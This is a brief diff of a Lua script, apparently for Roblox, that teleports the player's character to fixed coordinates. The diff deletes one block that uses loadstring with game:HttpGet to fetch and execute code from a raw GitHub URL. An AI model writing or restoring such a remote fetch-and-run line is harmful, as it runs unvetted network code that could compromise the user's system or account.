@@ -22,9 +22,4 @@ coroutine.wrap(function()
             char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-870, -38, -586) + Vector3.new(0, 5, 0)
         end)
     end)()
-
-    coroutine.wrap(function()
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/W9K/roblox-scripts/main/exec'))()
-    end)()
-
 end)()
